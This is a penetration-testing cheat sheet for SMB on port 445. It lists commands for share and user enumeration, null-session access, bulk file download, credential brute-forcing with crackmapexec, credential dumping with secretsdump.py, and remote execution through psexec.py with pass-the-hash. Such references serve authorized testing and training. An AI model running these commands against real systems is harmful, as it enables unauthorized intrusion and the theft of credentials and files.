# 445 - SMB

```bash
# nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <RPORT>
# smbclient //<RHOST>/<share>
# smbget -R smb://<RHOST>/<share>
```

## Listing shares

```bash
smbmap.py -H <target> -u <user> -p <pass/hash>
crackmapexec smb --shares <target> -u <user> -p <pass>

smbmap.py -H $1 -u "" -p ""
crackmapexec smb --shares $1 -u "" -p ""
```

## Connecting to share

```bash
smbclient.py <target>
  shares
  use <share>
  ls

# mount -t cifs [-o 'username=<user>,password=<pass>'] //<target>/<remote> <local>
```

## SMB commands

```bash
SMB> allinfo
SMB> more <file>:<stream>
SMB> recurse on
SMB> prompt off
SMB> mget *
```

## Bruteforcing

```bash
crackmapexec smb <target> -u <user/list> -p <pass/list> --continue-on-success
```

## secretsdump

```bash
secretsdump.py <domain>/<user>@<target>
```

## checking for psexec.py

```bash
crackmapexec smb <target> -u <user> (-H <hash> || -p <pass>)
```

## psexec.py

```bash
psexec.py <adminuser>@<target> [-hashes <hash:hash>]
```

## Default shares

```bash
ADMIN$
C$
IPC$
```

